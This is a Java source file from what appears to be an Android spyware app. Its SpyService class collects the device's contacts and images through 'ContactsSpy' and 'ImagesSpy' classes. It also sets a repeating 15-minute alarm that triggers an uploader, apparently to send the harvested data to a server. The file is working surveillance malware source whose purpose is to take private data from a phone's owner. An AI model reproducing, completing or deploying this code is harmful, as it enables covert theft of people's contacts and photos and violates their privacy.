package com.gameofcoding.spy.services;

import java.io.File;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.ExecutorService;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import com.gameofcoding.spy.spys.ContactsSpy;
import com.gameofcoding.spy.server.files.DataFiles;
import com.gameofcoding.spy.spys.ImagesSpy;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.receivers.UploaderAlarmReceiver;
import com.gameofcoding.spy.utils.NotificationUtils;
import java.util.List;
import java.util.ArrayList;
import com.gameofcoding.spy.utils.XLog;
import com.gameofcoding.spy.utils.Utils;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private static final int UPLOADER_ALARM_ID = 100;
    private static final int SPY_SERVICE_NOTIF_ID = 101;
    private Context mContext;

    @Override
    public IBinder onBind(Intent intent) {return null;}

    @Override
    public void onCreate() {
	super.onCreate();
	XLog.v(TAG, "SpyService has been started, preparing for loading data.");
	mContext = getApplicationContext();
	updateNotif("Starting...");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
	try {
	    Utils utils = new Utils(mContext);
	    if(utils.isServiceRunning(UploaderService.class.getName())) {
		// Wait until uploader service is finished
		XLog.v(TAG, "UploaderService is running, waiting until it finishes.");
		updateNotif("Waiting for syncing of data...");
		while(utils.isServiceRunning(UploaderService.class.getName()))
		    Thread.sleep(500);
		XLog.v(TAG, "UploaderService finsihed, continuing work.");
	    }
	    saveData();
	    updateNotif("Finishing...");
	    XLog.i(TAG, "Finished saving data");

	    // Start alarm that repeats after 30 mins. for uploading changes
	    AlarmManager alarmManager = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
	    PendingIntent pendingIntent = PendingIntent
		.getBroadcast(mContext, UPLOADER_ALARM_ID, new Intent(mContext, UploaderAlarmReceiver.class), 0);
	    alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(),
				      (1000 * 60) * 15, pendingIntent);
	    XLog.i(TAG, "UploaderAlarmReceiver set to repeat after 15 min.");
	} catch(Exception e) {
	    XLog.e(TAG, "Exception occurred");
	} finally {
	    stopService();
	}
	return START_STICKY;
    }

    private void stopService() {
	// Stop service
	stopForeground(true);
	stopSelf();
    }

    public void saveData() {
	try {
	    final DataFiles dataFiles = DataFiles.loadFiles(mContext);
	    final File userDataDir = dataFiles.getUserDataDir();
	    final File othersDir = dataFiles.getOthersDir();

	    // Clean data directory before storing anything
	    XLog.i(TAG, "Cleaning app data dir...");
	    cleanDataDir(userDataDir, othersDir);
	    XLog.i(TAG, "App data dir cleaned");

	    List<Future<?>> execFutures = new ArrayList<Future<?>>();
	    ExecutorService executor = Executors.newCachedThreadPool();
	    execFutures.add(executor.submit(new Runnable() {
		    @Override
		    public void run() {
			XLog.i(TAG, "saveData(): Started saving contacts...");
			new ContactsSpy(mContext, new File(userDataDir, ContactsSpy.CONTACTS_FILE_NAME))
			    .snoop();
		    }
		}));
	    execFutures.add(executor.submit(new Runnable() {
		    @Override
		    public void run() {
			XLog.i(TAG, "saveData(): Started saving imagess...");
			new ImagesSpy(mContext, new File(userDataDir, ImagesSpy.IMAGES_DIR_NAME))
			    .snoop();
		    }
		}));

	    // Wait until all tasks are finished
	    try {
		for(Future<?> execFuture : execFutures) {
		    if(execFuture != null) {
			execFuture.get();
		    }
		    else {
			XLog.w(TAG, "Exec future was null");
		    }
		}
	    } catch(Exception e) {
		XLog.e(TAG, "Exception occured while waiting for finishing of execution.", e);
	    }


	     //Store app logs
	    // TODO: Fixme chanage getExternalcachedir() > getFilesDir();
	    // XLog.i(TAG, "saveData(): Loading logs...");
	    // updateNotif("Loading logs...");
	    // File logFile = new File(getExternalCacheDir(), XLog.LOG_FILE_NAME);
	    // if(!logFile.renameTo(new File(othersDir, logFile.getName()))) {
	    //  	XLog.w(TAG, "Failed to move log file from=" + othersDir + logFile.getName()
	    //  	       + ", to=" + logFile);
	    // }
	} catch(Exception e) {
	    XLog.e(TAG, "Exception occurred in while saving data.", e);
	}
    }

    private boolean cleanDataDir(File userDataDir, File othersDir) {
	boolean hasDeleted = true;
        for(File file : userDataDir.listFiles()) {
	    if(!file.delete()) {
		XLog.v(TAG, "cleanDataDir(File, File): File could not be deleted, file=" + file);
		hasDeleted = false;;
	    }
	}
        for(File file : othersDir.listFiles()) {
	    if(!file.delete()) {
		XLog.v(TAG, "cleanDataDir(File, File): File could not be deleted, file=" + file);
		hasDeleted = false;
	    }
	}
	return hasDeleted;
    }

    @SuppressWarnings("deprecation")
    public void updateNotif(String contentText) {
	Notification.Builder notifBuilder = null;
	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
	    NotificationUtils notifUtils = new NotificationUtils(mContext);
	    notifUtils.createDefaultNotifChannel();
	    String channelID = notifUtils.getDefaultNotifChannelId();
	    notifBuilder = new Notification.Builder(mContext, channelID);
	} else {
	    notifBuilder = new Notification.Builder(mContext);
	}

	// Start foreground notification
	notifBuilder.setSmallIcon(R.mipmap.ic_launcher)
	    .setContentTitle(getString(R.string.spyservice_notif_content_title))
	    .setContentText(contentText);
	startForeground(SPY_SERVICE_NOTIF_ID, notifBuilder.build());
    }
}
